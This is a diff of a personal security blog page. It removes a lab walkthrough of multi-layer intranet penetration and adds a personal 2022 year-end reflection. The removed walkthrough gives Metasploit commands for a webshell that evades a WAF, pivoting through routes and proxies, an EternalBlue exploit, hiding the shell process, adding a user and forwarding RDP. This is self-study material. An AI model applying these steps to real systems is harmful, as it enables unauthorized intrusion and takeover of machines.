@@ -18,24 +18,23 @@
   <meta name="author" content="HackerTerry">
   <meta name="keywords" content="">
   
-    <meta name="description" content="环境搭建渗透靶机：Kali Linux 2021.3 第一层靶机 (外网web服务器):  CentOS 7 第二层靶机 (内网web服务器):  Ubuntu 18.04 第三层靶机 (内网办公机) : Windows 7  除渗透靶机外，每台靶机均安装宝塔面板且防火墙均关闭。 为了模拟外网攻击，渗透靶机的网络设置可以不用改变。  内网配置这里我们在“设置”–“虚拟网络编辑器”里面添加VMnet">
+    <meta name="description" content="前言2022年，注定是不平凡的一年：北京冬奥会、俄乌战争、上海疫情、中共二十大、郑州富士康、封控解除······时隔两年，我再度准备写一篇总结，总结一下这不平凡的一年，以及我这一年的心路历程。 正文犹记得今年年初，北京冬奥会隆重举行，某乙方大厂招募几百名白帽志愿者前去重保。当时报名的师傅实在太多，哪怕倒贴、不能陪家人一起过年，也挡不住白帽子师傅们对冬奥重保的热情。因为我刚入安全圈不过半年，没有任何">
 <meta property="og:type" content="article">
-<meta property="og:title" content="内网渗透（三）--多层内网">
-<meta property="og:url" content="https://rookieterry.github.io/2022/01/17/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%89%EF%BC%89-%E5%A4%9A%E5%B1%82%E5%86%85%E7%BD%91/index.html">
+<meta property="og:title" content="2022年度总结">
+<meta property="og:url" content="https://rookieterry.github.io/2022/12/21/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="HackerTerry&#39;s Blog">
-<meta property="og:description" content="环境搭建渗透靶机：Kali Linux 2021.3 第一层靶机 (外网web服务器):  CentOS 7 第二层靶机 (内网web服务器):  Ubuntu 18.04 第三层靶机 (内网办公机) : Windows 7  除渗透靶机外，每台靶机均安装宝塔面板且防火墙均关闭。 为了模拟外网攻击，渗透靶机的网络设置可以不用改变。  内网配置这里我们在“设置”–“虚拟网络编辑器”里面添加VMnet">
+<meta property="og:description" content="前言2022年，注定是不平凡的一年：北京冬奥会、俄乌战争、上海疫情、中共二十大、郑州富士康、封控解除······时隔两年，我再度准备写一篇总结，总结一下这不平凡的一年，以及我这一年的心路历程。 正文犹记得今年年初，北京冬奥会隆重举行，某乙方大厂招募几百名白帽志愿者前去重保。当时报名的师傅实在太多，哪怕倒贴、不能陪家人一起过年，也挡不住白帽子师傅们对冬奥重保的热情。因为我刚入安全圈不过半年，没有任何">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2022-01-17T09:33:28.000Z">
-<meta property="article:modified_time" content="2022-09-17T09:34:42.811Z">
+<meta property="article:published_time" content="2022-12-21T12:09:29.000Z">
+<meta property="article:modified_time" content="2022-12-21T13:44:24.493Z">
 <meta property="article:author" content="HackerTerry">
-<meta property="article:tag" content="内网渗透">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>内网渗透（三）--多层内网 - HackerTerry&#39;s Blog</title>
+  <title>2022年度总结 - HackerTerry&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -239,7 +238,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="内网渗透（三）--多层内网"></span>
+            <span id="subtitle" data-typed-text="2022年度总结"></span>
           
         </div>
 
@@ -255,8 +254,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-01-17 17:33" pubdate>
-          星期一, 一月 17日 2022, 5:33 下午
+        <time datetime="2022-12-21 20:09" pubdate>
+          星期三, 十二月 21日 2022, 8:09 晚上
         </time>
       </span>
     
@@ -268,7 +267,7 @@
         <i class="iconfont icon-chart"></i>
         
           <!-- compatible with older versions-->
-          2k 字
+          1.9k 字
         
       </span>
     
@@ -280,7 +279,7 @@
         
         
           <!-- compatible with older versions-->
-          17 分钟
+          16 分钟
         
       </span>
     
@@ -326,12 +325,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">内网渗透（三）--多层内网</h1>
+            <h1 style="display: none">2022年度总结</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：3 个月前
+                    本文最后更新于：1 分钟前
                   
                 
               </p>
@@ -339,55 +338,14 @@
             
               <div class="markdown-body">
                 
-                <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>渗透靶机：Kali Linux 2021.3</p>
-<p>第一层靶机 (外网web服务器):  CentOS 7</p>
-<p>第二层靶机 (内网web服务器):  Ubuntu 18.04</p>
-<p>第三层靶机 (内网办公机) : Windows 7</p>
-<blockquote>
-<p>除渗透靶机外，每台靶机均安装宝塔面板且防火墙均关闭。</p>
-<p>为了模拟外网攻击，渗透靶机的网络设置可以不用改变。</p>
-</blockquote>
-<h2 id="内网配置"><a href="#内网配置" class="headerlink" title="内网配置"></a>内网配置</h2><p>这里我们在“设置”–“虚拟网络编辑器”里面添加VMnet14和15两个网络适配器，均设置为“仅主机模式”。再把VMnet14的子网地址设置为192.168.22.0，把VMnet15的子网地址设置为192.168.33.0。</p>
-<p>把CentOS 7的网卡1设置为桥接模式，网卡2设置为自定义（VMnet14）；把Ubuntu的网卡1设置为VMnet14，网卡2设置为VMnet15；把Windows 7的网卡设置为VMnet15。</p>
-<p>完成配置后，正式开始渗透。</p>
-<h2 id="渗透步骤"><a href="#渗透步骤" class="headerlink" title="渗透步骤"></a>渗透步骤</h2><p>先在kali攻击机上用msf生成一个Linux木马。由于第一层靶机使用了thinkPHP的框架，所以直接上exp，写入一句话木马，再用蚁剑连接。但是，宝塔面板的waf会过滤掉“post”，所以我们把一句话木马进行base64编码后再上传即可。连接上以后，上传msf生成的Linux木马，设置监听（方法在前面的笔记里面有）。</p>
-<h3 id="msf查看网卡情况"><a href="#msf查看网卡情况" class="headerlink" title="msf查看网卡情况"></a>msf查看网卡情况</h3><p>首先输入<code>arp -a</code>查看该机器上的网卡信息。</p>
-<p>获取网络架构分布：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run get_local_subnets<br></code></pre></td></tr></table></figure>
-
-<p>添加路由访问：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">run autoroute -s 192.168.22.0/24或run post/multi/manage/autoroute<br></code></pre></td></tr></table></figure>
-
-<p>那为什么要添加路由呢？因为后面我们要进行主机端口扫描的时候，是需要退出当前meterpreter的。而退出了当前会话我们就不能访问内网主机了那我们就不能进行端口扫描。所以需要添加路由，那我们退出了meterpreter也能进行端口扫描（不管有没有添加路由都ping不通）</p>
-<p>查看路由表信息（检查路由是否添加成功）：</p>
-<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">run autoroute -p或route print<br></code></pre></td></tr></table></figure>
-
-<p>完成之后用<code>background</code>挂起会话，再使用socks4代理：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use auxiliary/server/socks_proxy<br><span class="hljs-built_in">set</span> VERSION 4a<br><span class="hljs-built_in">set</span> SRVHOST 192.168.50.xx <span class="hljs-comment">#我的网关ip为192.168.50.1，这里填kali攻击机的ip</span><br>exploit<br></code></pre></td></tr></table></figure>
-
-<h3 id="使用proxychains代理工具"><a href="#使用proxychains代理工具" class="headerlink" title="使用proxychains代理工具"></a>使用proxychains代理工具</h3><p>配置proxychains代理文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/proxychains4.conf<br></code></pre></td></tr></table></figure>
-
-<p>在最后一行添加：<code>socks4 192.168.50.xx 1080</code>并保存退出（这里的ip也是填kali的），再输入<code>session1</code>返回刚才的会话。</p>
-<p>用nmap扫描第二层靶机：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">proxychains</span> nmap -Pn -sT <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">22</span>.xx<br></code></pre></td></tr></table></figure>
-
-<p>当然你也可以选择本机挂代理访问，把kali攻击机作为代理服务器，socks4代理推荐用SocksCap64这款软件。</p>
-<p>用与前面同样的方法让第二层靶机上线，<code>arp -a</code>查看该机器上的网卡信息，配置路由，nmap扫描后发现第三层靶机开启了445端口，上网查询后发现存在“永恒之蓝”漏洞，于是直接使用msf内置的exp模块：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_psexec<br><span class="hljs-built_in">set</span> payload windows/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 192.168.33.xx<br>exploit<br></code></pre></td></tr></table></figure>
-
-<p>为了隐藏shell进程，我们可以进行进程迁移：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">getpid<br>run post/windows/manage/migrate<br></code></pre></td></tr></table></figure>
-
-<p>输入<code>shell</code>即可执行Windows添加用户的命令（如果shell中出现乱码，输入命令<code>chcp 65001</code>即可），退出shell后配置端口转发，把内网的3389端口转发到kali本地的1111端口：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">portfwd add -l 1111 -p 3389 -r 192.168.33.xx<br></code></pre></td></tr></table></figure>
-
-<p>启动远程桌面：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">rdesktop -u 用户名 -p 密码 192.168.50.xx:1111 <span class="hljs-comment">#ip同样是kali的</span><br></code></pre></td></tr></table></figure>
-
-<p>渗透结束，收工，接下来我们就可以操控第三层靶机愉快地玩耍了！</p>
-<h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><p>在配置第一层靶机的thinkPHP环境时，首先输入<code>bt default</code>查看宝塔面板安全入口，再登录进去。<strong>这里注意了，显示的公网ip是不能用来直接登录的，我们要使用家里局域网的ip登录。</strong>登录进去以后把域名改为第一层靶机的两个网卡对应的ip，然后把根目录设为<code>/www/wwwroot/ThinkPHP</code>。<strong>第二个坑来了：这里还要配置thinkPHP的伪静态规则，并且把启动目录设为<code>/public</code>（已知thinkPHP版本为5）。</strong></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的笔记看似内容不多且简单，其实需要很长时间消化，本人在复现的过程中也遇到了重重困难。内网渗透的学习绝非易事，让我们一起加油，攻克内网渗透这个大难关！</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2022年，注定是不平凡的一年：北京冬奥会、俄乌战争、上海疫情、中共二十大、郑州富士康、封控解除······时隔两年，我再度准备写一篇总结，总结一下这不平凡的一年，以及我这一年的心路历程。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>犹记得今年年初，北京冬奥会隆重举行，某乙方大厂招募几百名白帽志愿者前去重保。当时报名的师傅实在太多，哪怕倒贴、不能陪家人一起过年，也挡不住白帽子师傅们对冬奥重保的热情。因为我刚入安全圈不过半年，没有任何实习&#x2F;hw经历，所以这对于我来说是一个很不错的锻炼机会，我就也想着报名试试。但是很遗憾，我错过了这次机会。接下来的日子里，我在家苦学Python编程，学会了写一些简单的脚本和爬虫，也让我喜欢上了这门简单又好用的语言。</p>
+<p>转眼间寒假就结束了，我也迎来了大学本科期间课程最多的一个学期–大二下学期。五门专业课，三门公共课，还包含两门纯外教的专业课，说不累都是假的。看到课表的时候，我的内心是破防的：仅仅是考研408的专业课，就占到了两门！由于我并没有考研的打算，再加上那些专业课过于偏重理论，我觉得太枯燥，所以提不起半点学习学校知识的兴趣。正好当时学校开设了Java课程，我便想着跟学校把Java基础打好，为后面的代码审计做铺垫，可是学校的课程内容同样令人失望。无奈，我只得求助于B站大学，这里安利一下B站尚硅谷”康师傅“的Java基础课程，以及动力节点老杜的Java Web课程，他们都讲得挺不错的！一晃就来到了期末考试周，由于专业课没怎么学，专业课只能靠室友才勉强通过考试，最后发现竟然没有挂科，属于是意外之喜了。</p>
+<p>又到了新的一个暑假，为了不让暑假就此荒废，我被父母安排到了某科研机构进行暑期实习，地点是在北京。这是我第一次试着自己租房，第一次体验北京的早晚高峰–每天往返单位和出租屋都要三个小时，第一次自己坐高铁和飞机，也第一次尝试着自己做饭。实习期间，我第一次接触到了二进制安全–我个人认为，它是信息安全所有技术方向的天花板。不过由于我在二进制安全方面完全没有基础，我仅仅被要求学会使用模糊测试工具–AFL（后面我会写相关技术文章，介绍使用方法），以及一些简单的汇编语言。可暑期实习终究是短暂的，两个月后我的暑假走向了尾声。没想到接下来的一件事点燃了“导火索”，改变了我的人生规划。</p>
+<p>当时我已经结束了第二次对家庭网络的改造，但总觉得家庭网络不是很安全：因为有公网ip，而且我为了方便在外网对家中网络设备进行管理，大量的内网端口被转发到公网，对家庭网络的安全造成了很大的威胁。例如，内网群晖nas服务器的22端口经常被爆破，哪怕我修改了默认端口也还是避免不了被nmap扫描出指纹信息。于是我打算采用VPN技术，穿透到内网管理众多的网络设备。可没想到我打开手机流量模拟外网测试时，可能是触发了运营商机房的流量特征匹配规则，我在第二天早上便接到了网警的电话，警告我不要再“翻墙”，还被上门查了水表。我纳闷了，不就是用VPN内网穿透，怎么就成“翻墙”了？怎么还被查水表了？这件事让我认识到，没想到在墙国，技术都是有罪的，无论用途如何。这件事点燃了我心中想润出去的导火索，让我下定决心出国留学。</p>
+<p>其实在这件事之前，我想润的心就一直蠢蠢欲动：每天排队做核酸、无止境的内卷、努力也不一定有收获、国内浮躁的安全圈、35岁中年危机······这些社会现实问题都像悬在我头顶上的剑，驱使着我尽快逃离这个国家。这件事只不过是点燃了我内心的“导火索”，让我重新认识自己、对人生作出规划。可能放弃国内已有的人脉资源，出国从头再来，对很多人来说都很难下定决心，但是考虑到国内重视所谓“人情世故”，而轻视真正实干者的大环境，以及国内网安行业的浮躁和内卷，以及其它种种原因，让我下定了润的决心。好在我本科期间学校的课程虽然摆烂，没有认真去学，但是均分和GPA不算太难看，仍然可以申请到不错的硕士学校。</p>
+<p>回首这一年，除了技术，我也差一点收获了自己的爱情。大二下学期，因为一次机缘巧合，我在学校的表白墙加了一个大一小学妹的QQ，没想到因此获得了她的喜欢。在她眼中，我是一个优秀的（虽然我自己并不这么觉得）、真诚的男生，身高也很完美，但我却觉得不合适，最后我还是失去了我的桃花运，也算是这一年小小的遗憾吧！</p>
+<h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>希望在2023新的一年，我能和雅思和平分手，申请到心目中理想的学校！祝各位看到这篇文章的师傅们心想事成，身体健康（还有新冠检测阴性），万事如意！考研的一战成硕，秋招没找到工作的春招必上岸，在职的升职加薪，在这里给师傅们拜个早年了！</p>
 
                 
               </div>
@@ -406,7 +364,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="category-chain-item">Web安全</a>
+  <a href="/categories/%E7%94%9F%E6%B4%BB%E7%82%B9%E6%BB%B4/" class="category-chain-item">生活点滴</a>
   
   
 
@@ -418,13 +376,6 @@
     </div>
   
   
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">#内网渗透</a>
-      
-    </div>
-  
 </div>
 
 
@@ -433,8 +384,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>内网渗透（三）--多层内网</div>
-      <div>https://rookieterry.github.io/2022/01/17/内网渗透（三）-多层内网/</div>
+      <div>2022年度总结</div>
+      <div>https://rookieterry.github.io/2022/12/21/2022年度总结/</div>
     </div>
     <div class="license-meta">
       
@@ -446,7 +397,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>星期一, 一月 17日 2022, 5:33 下午</div>
+          <div>星期三, 十二月 21日 2022, 8:09 晚上</div>
         </div>
       
       
@@ -490,18 +441,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/01/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E5%9B%9B%EF%BC%89-%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/" title="内网渗透（四）--通信技术">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">内网渗透（四）--通信技术</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/12/07/%E7%AC%AC%E5%85%AD%E5%B1%8A%E2%80%9C%E6%A5%9A%E6%85%A7%E6%9D%AF%E2%80%9D%E5%AE%98%E6%96%B9Write-up/" title="第六届&#34;楚慧杯&#34;官方Write-up">
-                        <span class="hidden-mobile">第六届&#34;楚慧杯&#34;官方Write-up</span>
+                      <a href="/2022/09/17/%E9%87%8D%E4%BF%9D%E4%B8%80%E9%9D%A2%E9%9D%A2%E7%BB%8F/" title="重保一面面经">
+                        <span class="hidden-mobile">重保一面面经</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
